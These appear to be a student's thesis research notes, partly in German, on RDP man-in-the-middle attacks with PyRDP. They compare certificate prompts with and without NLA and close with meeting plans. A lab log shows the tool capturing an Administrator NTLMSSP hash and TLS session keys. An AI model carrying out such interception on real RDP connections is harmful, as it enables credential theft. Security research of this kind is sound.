# No NLA
## Cert Prompt when MITM is not active
![[Pasted image 20221002155017.png]]
![[Pasted image 20221007070851.png]]
## Cert Prompt when MITM is active
![[Pasted image 20221002154905.png]]
![[Pasted image 20221007070609.png]]
# NLA
## Cert prompt when MITM is not active
![[Pasted image 20221002155407.png]]
## Connection error when MITM is active
![[Pasted image 20221002155644.png]]
```
[2022-10-02 17:56:18,578] - INFO - Karen426360 - pyrdp.mitm.connections.tcp - New client connected from 192.168.1.137:49809
[2022-10-02 17:56:18,579] - INFO - Karen426360 - pyrdp.mitm.connections.x224 - Cookie: mstshash=PYRDP-SER
[2022-10-02 17:56:18,581] - INFO - Karen426360 - pyrdp.mitm.connections.tcp - Server connected
[2022-10-02 17:56:18,589] - INFO - Karen426360 - pyrdp.mitm.connections.x224 - Server requires CredSSP/NLA and we are not configured to support it. Attempting to capture client's NTLM hashes.
[2022-10-02 17:56:18,590] - INFO - Karen426360 - pyrdp.mitm.connections.x224 - Cookie: mstshash=PYRDP-SER
[2022-10-02 17:56:18,594] - INFO - Karen426360 - pyrdp.mitm.connections.tcp - Server connected
[2022-10-02 17:56:19,611] - INFO - Karen426360 - pyrdp.mitm.connections.cert - Using cached certificate for pyrdp-server
CLIENT_RANDOM 6339b4a2e87e174d024bb45afd98d4dac8ff984ffd0dfa8b1d20a9f615483f9a cc20bbd636a68f9735fbc33e717888a71f091d13055babad9935a2e74c287ca3fd84ba0fa8f4427736744f272459f0b0
[2022-10-02 17:56:19,663] - INFO - Karen426360 - pyrdp.mitm.connections.ntlmssp - [!] NTLMSSP Hash: Administrator::PYRDP-SERVER:38534a43a2b2ee0c:a173700da746fd09ac928606a39f43ce:010100000000000095227a8277d6d80161a202f7cc59893a0000000002000a00570049004e004e00540001000a00570049004e004e00540004000a00570049004e004e00540003000a00570049004e004e00540005000a00570049004e004e005400080030003000000000000000010000000020000098e1302edfd4e9a1343e71191d45723068f0c0daa2e183d20a3318b847b10f910a0010000000000000000000000000000000000009002a005400450052004d005300520056002f003100390032002e003100360038002e0031002e003100330036000000000000000000
[2022-10-02 17:56:19,668] - INFO - Karen426360 - pyrdp.mitm.connections.tcp - Client connection closed. Connection to the other side was lost in a non-clean fashion: Connection lost.
[2022-10-02 17:56:19,669] - INFO - Karen426360 - pyrdp.mitm.connections.tcp - Connection report: report: 1.0, connectionTime: 1.089294672012329, totalInput: 0, totalOutput: 0, replayFilename: rdp_replay_20221002_17-56-18_578_Karen426360.pyrdp
```

# NLA
- open / not open?

# Meetings
- Alle 14 Tage
- Notizen nach Meeting
- Notizen in Bericht
- Definitionen schreiben
	- P1, P2?, Thesis?
	- Formvorgaben
- Ziel bis nächstes Meeting
	- Definition schreiben
	- Komponenten defnieren
		- Client / Server / Attacker / Spoofing
		- Diagramm?
	- Einlesen NLA / CredSSP
	- Poc???
	- OST Code organisieren
